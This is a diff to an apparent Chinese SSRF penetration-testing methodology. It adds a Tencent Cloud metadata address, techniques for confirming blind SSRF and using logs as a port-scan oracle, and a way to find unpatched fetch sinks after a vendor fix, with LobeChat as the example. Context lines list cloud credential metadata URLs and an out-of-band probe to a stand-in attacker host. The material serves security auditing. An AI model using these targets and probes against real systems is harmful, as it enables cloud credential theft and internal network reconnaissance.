@@ -179,6 +179,7 @@ http://100.100.100.200/latest/meta-data/ram/security-credentials/
 
 # 腾讯云
 http://metadata.tencentyun.com/latest/meta-data/
+http://169.254.0.23/latest/meta-data/          # 腾讯云链接层地址,容器网络常可直连(实测口径见 §6.1)
 
 # 华为云
 http://169.254.169.254/openstack/latest/meta_data.json
@@ -255,6 +256,22 @@ curl -I "https://target//admin"
 curl -I "https://target/admin;%2f"
 ```
 
+### 3.11 盲打 SSRF 判定(响应无差异时)
+
+fetch 失败被服务端 try/catch 静默吞掉时,tRPC/JSON 响应对"端口开/关"完全一致 → 盲打。判定只能靠外部观测点(来源: [xz.aliyun.com/news/92685](https://xz.aliyun.com/news/92685), 2026-08-30):
+
+```
+1. 攻击者可控的内网 HTTP 服务(如已在内网的测试机)看访问日志
+   → 请求到达 = 目标服务器主动打过来了,实锤 + 内网拓扑
+2. 目标服务器 debug 日志(若有)
+   → files=1(附件字节成功下载)/ files=0(失败) 逐端口区分,可当端口扫描 oracle
+3. 响应侧"永远一样的超时错误"本身也是特征:
+   → 如固定回 Connect Timeout Error (attempted address: discord.com:443)
+   → 错误指向下游平台而非目标 URL,说明 fetch 异常被吞、流程照走
+```
+
+**代理型 vs 转发型(审计必分)**:服务端自己 fetch 用户 URL = 代理型(有 SSRF);把 URL 原样透传给第三方平台由对方拉取(如 Telegram API) = 转发型(对目标服务器不构成 SSRF)。工具/脚本标出的可疑点要逐个人工定性,不能自动出结论。
+
 ---
 
 ## 4. Bypass 矩阵（SSRF 详见 methodology/02 第 6 章）
@@ -315,6 +332,23 @@ Web Cache Deception
 | Jira CVE-2019-8451 | `/plugins/servlet/gadgets/makeRequest?url=...` |
 | WeasyPrint / wkhtmltopdf | PDF 生成器解析 HTML 中 `<img src=>` 触发 SSRF |
 | Microsoft Outlook | 邮件预览 / 富文本 fetch SSRF |
+| LobeChat botMessage(CVE-2026-59095 同类第 5 洞) | bot 附件 `fetchUrl` 裸 fetch → 宿主机 9999 / 腾讯云 metadata `169.254.0.23`(盲打,见 §3.11) |
+
+### 6.1 修复完整性审计:补丁 diff → 同类 sink 盘点
+
+公开 SSRF 补丁落地后(组件在 scope 内),修的从来只是"被报的那几个调用点"。方法(来源: [xz.aliyun.com/news/92685](https://xz.aliyun.com/news/92685), 2026-08-30,LobeChat 官方修 6 处漏 4 处同类型实测):
+
+```
+1. 拉 patch diff,看清修复了哪些 fetch/请求调用点、套了什么防护封装
+2. 全量盘点同类 sink:所有 fetch 用户可控 URL 的调用点
+   - URL 来源筛"用户输入":入口-出口关联(router/API 输入 schema 的 z.string().url()
+     字段名 × fetch 变量名);fetchUrl/imageUrl/externalUrl=强信号,baseUrl/webhookUrl=弱信号
+3. 差集 = 未套防护的用户可控调用点 → 逐个验证(注意 §3.11 代理型/转发型定性)
+4. 黑盒对应动作:目标已打补丁 ≠ 安全——找同入口的第二条业务线
+   (LobeChat 的教训:skill 导入修了,bot 附件下载同一问题四个平台全裸奔)
+5. 附带收获:z.string().url() 只验格式不验内网;凭证只验格式不验真伪
+   (botToken 三段式正则,伪造即过)——"每个环节单独无害,串起来就是完整 SSRF"
+```
 
 通用指纹：
 - `?url=https://oob.attacker.cc/x` → OOB 平台收到 → 基本 SSRF
